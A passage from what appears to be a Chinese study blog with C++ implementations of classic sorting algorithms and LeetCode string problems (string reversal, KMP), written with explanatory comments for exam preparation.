<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shellSort</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt; &amp;arr)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这里假设增量d最开始为5</span></span><br><span class="line">    <span class="keyword">int</span> d=<span class="number">5</span>;</span><br><span class="line">    <span class="keyword">while</span>(d)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=d;i&lt;arr.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">         <span class="comment">//这里类比插入排序,插入排序从1开始,这里就从每一组的第二个元素开始</span></span><br><span class="line">         <span class="keyword">int</span> j=i;</span><br><span class="line">         <span class="keyword">while</span>(arr[j]&lt;arr[j-d]&amp;&amp;j&gt;=d)&#123;</span><br><span class="line">             <span class="comment">//从后往前,每次跳d个进行比较,同时要保证j-d&gt;=0也就是j&gt;=d</span></span><br><span class="line">             <span class="keyword">int</span> temp=arr[j];</span><br><span class="line">             arr[j]=arr[j-d];</span><br><span class="line">             arr[j-d]=temp;</span><br><span class="line">             j-=d;</span><br><span class="line">         &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        d/=<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//输出结果</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="交换排序"><a href="#交换排序" class="headerlink" title="交换排序"></a>交换排序</h3><h4 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h4><p>代码很简单,注意i和j的边界问题即可</p>
<p>还有就是可以设置一个flag变量,记录每一轮有没有发生交换,若没有发生交换则说明已经有序了,就可以直接结束了</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bubbleSort</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt; &amp;arr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = arr.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                flag = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">int</span> temp = arr[j];</span><br><span class="line">                arr[j] = arr[j + <span class="number">1</span>];</span><br><span class="line">                arr[j + <span class="number">1</span>] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (flag == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        flag = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//输出结果</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="快排"><a href="#快排" class="headerlink" title="快排"></a>快排</h4><p>快排的本质是每一次根据<code>pivotKey</code>划分左右区间的过程</p>
<p>这里的代码是递归形式的,也解释了为什么快排在有序情况下时间复杂度为O(N²),空间复杂度为O(N)</p>
<p>注:这里整体用的是左闭右闭区间</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">partition</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt; &amp;arr, <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pivotKey = arr[left];</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="comment">//left被挖了一个坑,先从右边找一个填坑</span></span><br><span class="line">        <span class="keyword">while</span> (left &lt; right &amp;&amp; arr[right] &gt;= pivotKey) &#123;</span><br><span class="line">            right--;</span><br><span class="line">        &#125;</span><br><span class="line">        arr[left] = arr[right];</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right &amp;&amp; arr[left] &lt;= pivotKey) &#123;</span><br><span class="line">            left++;</span><br><span class="line">        &#125;</span><br><span class="line">        arr[right] = arr[left];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//根据pivotKey把左右元素分开之后,left==right,随便返回一个就是枢轴</span></span><br><span class="line">    arr[left] = pivotKey;</span><br><span class="line">    <span class="keyword">return</span> left;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quickSort</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt; &amp;arr, <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//这里注意要加上left&lt;right的判断</span></span><br><span class="line">    <span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="keyword">int</span> pivot = <span class="built_in">partition</span>(arr, left, right);</span><br><span class="line">        <span class="built_in">quickSort</span>(arr, left, pivot - <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">quickSort</span>(arr, pivot + <span class="number">1</span>, right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; arr = &#123;<span class="number">48</span>, <span class="number">39</span>, <span class="number">64</span>, <span class="number">93</span>, <span class="number">76</span>, <span class="number">15</span>, <span class="number">27</span>, <span class="number">48</span>, <span class="number">56</span>, <span class="number">3</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">quickSort</span>(arr, <span class="number">0</span>, arr.<span class="built_in">size</span>()<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h3><h4 id="简单选择排序"><a href="#简单选择排序" class="headerlink" title="简单选择排序"></a>简单选择排序</h4><p>算法的思想很简单,而且它的总对比次数是一个定值</p>
<p><code>i</code>就是每次要更新的最小位置下标,内层从<code>i+1</code>开始,如果某一个值比<code>minIndex</code>对应的值小,则更新<code>minIndex</code>,最后把<code>minIndex</code>和<code>arr[i]</code>进行交换即可</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">selectSort</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt; &amp;arr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> minIndex = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        minIndex = i;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; arr.<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[j] &lt; arr[minIndex]) &#123;</span><br><span class="line">                minIndex = j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> temp = arr[i];</span><br><span class="line">        arr[i] = arr[minIndex];</span><br><span class="line">        arr[minIndex] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h4><p>最关键的两个函数就是<code>heapInsert()</code>向上调整,和<code>heapify()</code>向下调整</p>
<p>一开始先建堆,有两种建堆的方式:</p>
<ol>
<li>从第一个元素开始逐次增加堆的size并逐个向上调整,时间复杂度为O(NlogN)</li>
<li>从最后一个分支结点开始向下调整到堆尾,王道书上也是这个方法,其总比较次数优于第一种,不超过4N</li>
</ol>
<p>上面这两个建堆方法起始有点阴阳调和的感觉,从头开始往下建堆的采用的是向上调整,而从最后一个分支节点开始向上建堆的采用的是向下调整</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">heapInsert</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt; &amp;arr, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//向上调整</span></span><br><span class="line">    <span class="comment">//因为(0-1)/2也是0,所以这里到顶就会自动退出循环</span></span><br><span class="line">    <span class="keyword">while</span> (arr[i] &gt; arr[(i<span class="number">-1</span>)/<span class="number">2</span>]) &#123;</span><br><span class="line">        <span class="built_in">swap</span>(arr[i], arr[(i<span class="number">-1</span>)/<span class="number">2</span>]);</span><br><span class="line">        i=(i<span class="number">-1</span>)/<span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="built_in">heapify</span>(vector&lt;<span class="keyword">int</span>&gt; &amp;arr, <span class="keyword">int</span> i, <span class="keyword">int</span> size) &#123;</span><br><span class="line">    <span class="comment">//向下调整</span></span><br><span class="line">    <span class="keyword">int</span> l = i * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; size) &#123;</span><br><span class="line">        <span class="comment">//有孩子则还能往下调整</span></span><br><span class="line">        <span class="keyword">int</span> best = i;</span><br><span class="line">        <span class="keyword">if</span> (l + <span class="number">1</span> &lt; size) &#123;</span><br><span class="line">            <span class="comment">//有右孩子</span></span><br><span class="line">            <span class="keyword">if</span> (arr[l] &gt; arr[l + <span class="number">1</span>]) &#123;</span><br><span class="line">                best = l;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                best = l + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//只有左孩子</span></span><br><span class="line">            best = l;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (arr[best] &gt; arr[i]) &#123;</span><br><span class="line">            <span class="comment">//孩子里最大的比i大,故交换,然后继续向下,i变成它最大孩子的下标,左孩子的下标重新计算</span></span><br><span class="line">            <span class="built_in">swap</span>(arr[i], arr[best]);</span><br><span class="line">            i = best;</span><br><span class="line">            l = i * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//i比左右孩子都大或者等于,直接就不继续向下调整了</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这是第一种建堆方式的堆排序,这也是优先队列逐渐push的过程</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">heapSort1</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt; &amp;arr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//先建堆,从上往下建堆,比较简单</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        <span class="built_in">heapInsert</span>(arr, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//再把最后一个元素和0位置进行交换再向下调整堆</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = arr.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="built_in">swap</span>(arr[i], arr[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">heapify</span>(arr, <span class="number">0</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//这是第二种建堆方式的堆排序</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">heapSort2</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt; &amp;arr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//从堆中最后一个分支元素也就是arr.size()/2开始向下调整</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=arr.<span class="built_in">size</span>()/<span class="number">2</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">        <span class="built_in">heapify</span>(arr,i,arr.<span class="built_in">size</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//再把最后一个元素和0位置进行交换再向下调整堆</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = arr.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="built_in">swap</span>(arr[i], arr[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">heapify</span>(arr, <span class="number">0</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt; &amp;arr, <span class="keyword">int</span> left, <span class="keyword">int</span> mid, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> index1 = left;<span class="comment">//左半边的开头</span></span><br><span class="line">    <span class="keyword">int</span> index2 = mid + <span class="number">1</span>;<span class="comment">//右半边的开头</span></span><br><span class="line"></span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">temp</span><span class="params">(right - left + <span class="number">1</span>)</span></span>;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (index1 &lt;= mid &amp;&amp; index2 &lt;= right) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (arr[index1] &lt; arr[index2]) &#123;</span><br><span class="line">            temp[i++] = arr[index1++];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            temp[i++] = arr[index2++];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (index1 &lt;= mid) &#123;</span><br><span class="line">        temp[i++] = arr[index1++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (index2 &lt;= right) &#123;</span><br><span class="line">        temp[i++] = arr[index2++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; temp.<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">        arr[left + j] = temp[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mergeSort</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt; &amp;arr, <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="keyword">int</span> mid = (left + right) / <span class="number">2</span>;</span><br><span class="line">        <span class="built_in">mergeSort</span>(arr, left, mid);</span><br><span class="line">        <span class="built_in">mergeSort</span>(arr, mid + <span class="number">1</span>, right);</span><br><span class="line">        <span class="built_in">merge</span>(arr, left, mid, right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; arr = &#123;<span class="number">48</span>, <span class="number">39</span>, <span class="number">64</span>, <span class="number">93</span>, <span class="number">76</span>, <span class="number">15</span>, <span class="number">27</span>, <span class="number">48</span>, <span class="number">56</span>, <span class="number">3</span>&#125;;</span><br><span class="line">    <span class="built_in">mergeSort</span>(arr, <span class="number">0</span>, arr.<span class="built_in">size</span>() - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <tags>
        <tag>算法</tag>
        <tag>排序</tag>
        <tag>考研</tag>
      </tags>
  </entry>
  <entry>
    <title>字符串</title>
    <url>/2024/09/28/%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><h4 id="344-反转字符串"><a href="#344-反转字符串" class="headerlink" title="344. 反转字符串"></a><a href="https://leetcode.cn/problems/reverse-string/">344. 反转字符串</a></h4><p>最简单的一题,用双指针操作就行</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverseString</span><span class="params">(vector&lt;<span class="keyword">char</span>&gt;&amp; s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span> temp;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> j = s.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">            temp = s[i];</span><br><span class="line">            s[i] = s[j];</span><br><span class="line">            s[j] = temp;</span><br><span class="line">            i++;</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h4 id="541-反转字符串-II"><a href="#541-反转字符串-II" class="headerlink" title="541. 反转字符串 II"></a><a href="https://leetcode.cn/problems/reverse-string-ii/">541. 反转字符串 II</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011132395.png" alt="image-20241001113248347"></p>
<p>本题对反转字符串有了新的规则</p>
<p>打破一个传统思想:字符串并不一定要逐个遍历其中的字符,也可以跳着遍历</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">reverseStr</span><span class="params">(string s, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.<span class="built_in">length</span>();</span><br><span class="line">        <span class="keyword">int</span> end = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i += <span class="number">2</span> * k) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i + k &lt; n) &#123;</span><br><span class="line">                <span class="comment">//判断剩下的够不够k个</span></span><br><span class="line">                <span class="built_in">myReverse</span>(s, i, i + k - <span class="number">1</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">myReverse</span>(s, i, n - <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">myReverse</span><span class="params">(string&amp; s, <span class="keyword">int</span> begin, <span class="keyword">int</span> end)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = begin;</span><br><span class="line">        <span class="keyword">int</span> j = end; <span class="comment">// 下标</span></span><br><span class="line">        <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">            <span class="built_in">swap</span>(s[i], s[j]);</span><br><span class="line">            i++;</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="151-反转字符串中的单词"><a href="#151-反转字符串中的单词" class="headerlink" title="151. 反转字符串中的单词"></a><a href="https://leetcode.cn/problems/reverse-words-in-a-string/">151. 反转字符串中的单词</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011133876.png" alt="image-20241001113303819"></p>
<p>本题有两个关键点</p>
<ol>
<li>消去不合法空格的处理逻辑</li>
<li>对合法字符串整体反转,再对每个单词进行翻转,就得到了反着的句子</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">string <span class="title">reverseWords</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.<span class="built_in">length</span>();</span><br><span class="line">        <span class="keyword">int</span> flag = <span class="number">0</span>;<span class="comment">//flag用于标识是否遍历到第一个字符用于消去字符串前置空格</span></span><br><span class="line">        string temp = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s[i] == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (flag != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (i &lt; n - <span class="number">1</span> &amp;&amp; s[i + <span class="number">1</span>] != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                        temp += s[i];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                flag = <span class="number">1</span>;</span><br><span class="line">                temp += s[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// temp就是去掉不合法空格之后的s</span></span><br><span class="line">        <span class="built_in">reverse</span>(temp.<span class="built_in">begin</span>(), temp.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">int</span> start = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; temp.<span class="built_in">length</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (temp[i] == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                <span class="comment">//反转每个单词    (这里的reverse是左闭右开)</span></span><br><span class="line">                <span class="built_in">reverse</span>(temp.<span class="built_in">begin</span>() + start, temp.<span class="built_in">begin</span>() + i);</span><br><span class="line">                <span class="comment">//记录下一个单词的开始位置</span></span><br><span class="line">                start = i + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//因为前面检测的是空格,所以最后有可能会剩一个单词,单独处理一下它的反转</span></span><br><span class="line">        <span class="keyword">if</span>(start&lt;n)&#123;</span><br><span class="line">            <span class="built_in">reverse</span>(temp.<span class="built_in">begin</span>() + start, temp.<span class="built_in">end</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> temp;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h3 id="KMP"><a href="#KMP" class="headerlink" title="KMP"></a>KMP</h3><p>这类题目的难点在于next的数组的快速求解</p>
<h4 id="28-找出字符串中第一个匹配项的下标"><a href="#28-找出字符串中第一个匹配项的下标" class="headerlink" title="28. 找出字符串中第一个匹配项的下标"></a><a href="https://leetcode.cn/problems/find-the-index-of-the-first-occurrence-in-a-string/">28. 找出字符串中第一个匹配项的下标</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410031639374.png" alt="image-20241003163921305"></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">strStr</span><span class="params">(string haystack, string needle)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; next = <span class="built_in">getNext</span>(needle);</span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; haystack.<span class="built_in">length</span>() &amp;&amp; j &lt; needle.<span class="built_in">length</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (needle[j] == haystack[i]) &#123;</span><br><span class="line">                j++;</span><br><span class="line">                i++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (j == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">//已经比较过i和j不相等了,并且j没地方跳了,直接从下一个位置开始比较</span></span><br><span class="line">                i++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                j = next[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (j == needle.<span class="built_in">length</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> i - j;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">getNext</span><span class="params">(string pattern)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">next</span><span class="params">(pattern.length(), <span class="number">0</span>)</span></span>;</span><br><span class="line">        next[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span>(pattern.<span class="built_in">length</span>()==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="number">-1</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        next[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">int</span> cn = <span class="number">0</span>; <span class="comment">// 因为i对应的前一个元素的next值为0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (i &lt; next.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pattern[i - <span class="number">1</span>] == pattern[cn]) &#123;</span><br><span class="line">                next[i++] = ++cn;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cn &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// 往前跳找最长前缀</span></span><br><span class="line">                cn = next[cn];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 跳到头了</span></span><br><span class="line">                next[i++] = <span class="number">0</span>; <span class="comment">// 最长公共前后缀就是0了</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="572-另一棵树的子树"><a href="#572-另一棵树的子树" class="headerlink" title="572. 另一棵树的子树"></a><a href="https://leetcode.cn/problems/subtree-of-another-tree/">572. 另一棵树的子树</a></h4><h5 id="前序-中序遍历-失败"><a href="#前序-中序遍历-失败" class="headerlink" title="前序+中序遍历(失败)"></a>前序+中序遍历(失败)</h5><p>这题我一开始的想法是由于<code>前序+中序能唯一确定一棵二叉树</code>,所以直接用kmp比较两个二叉树的前序和中序序列是否包含子串,但是大部分用例都过了,有一个莫名其妙的不过(难道这个subRoot不是root的子树吗)</p>
<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410031853111.png" alt="image-20241003185314070" style="zoom: 67%;" />

<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410031853678.png" alt="image-20241003185329640" style="zoom:67%;" />

